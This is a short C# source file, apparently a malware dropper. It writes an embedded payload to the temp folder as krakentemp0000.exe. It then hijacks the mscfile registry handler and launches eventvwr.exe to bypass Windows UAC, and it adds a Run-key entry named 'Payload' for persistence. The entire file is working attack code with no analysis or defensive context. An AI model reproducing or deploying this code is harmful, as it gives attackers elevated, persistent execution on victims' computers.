using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using UAC.Properties;

namespace UAC;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		string text = "";
		text = Path.GetTempPath();
		text = Path.Combine(text, "krakentemp0000.exe");
		File.WriteAllBytes(text, Resources.Update);
		Thread.Sleep(3000);
		if (File.Exists(text) && !UAC(text))
		{
			Process.Start(text);
		}
	}

	public static bool UAC(string executablePath)
	{
		try
		{
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Classes\\mscfile\\shell\\open\\command").SetValue("", executablePath);
			Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("Payload", executablePath);
			Process.Start("eventvwr.exe");
			return true;
		}
		catch
		{
			return false;
		}
	}
}
